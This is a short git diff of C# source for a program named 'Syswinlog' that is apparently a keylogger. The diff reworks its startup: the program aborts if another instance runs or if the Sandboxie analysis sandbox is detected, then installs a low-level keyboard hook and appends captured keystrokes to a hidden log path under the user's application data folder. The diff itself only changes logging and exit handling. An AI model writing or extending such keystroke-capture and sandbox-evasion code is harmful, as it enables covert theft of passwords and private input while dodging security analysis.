@@ -11,6 +11,7 @@ using Syswinlog.Classes.NativeMethods;
 using Syswinlog.Classes.Constants;
 using Syswinlog.Classes.Startup;
 using Syswinlog.Classes.HostInfo;
+using Syswinlog.Classes.StatusLog;
 
 namespace Syswinlog
 {
@@ -18,13 +19,13 @@ namespace Syswinlog
     {
         public static void Main(string[] args)
         {
-            // Check if an instance is already running
             if ( Utils.IsInstanceRunning() ) {
-                return;
+                StatusLog.Log("A running instance is already present! [ABORTING]");
+                Application.Exit();
             }
             if ( Utils.DetectSandboxie() ) {
-                Terminate( "Sandboxie detected! [ABORTING]" );
-                // StatusLog.Log( "Sandboxie detected! [ABORTING]" );
+                StatusLog.Log("Sandboxie detected! [ABORTING]");
+                Application.Exit();
             }
 
             _hookptr = SetHook(KeyBoardProcCallback);
@@ -91,12 +92,6 @@ namespace Syswinlog
                     Environment.SpecialFolder.ApplicationData) + Constants.KeyLogPath, true, Encoding.Unicode) ) {
                 _outfile.Write(_internal);
             }
-        }
-
-        public static void Terminate(string err)
-        {
-            Console.WriteLine($"{err}");
-            Application.Exit();
         }
 
         public static void SetConsoleWindow(Constants.ConsoleWindowState state)
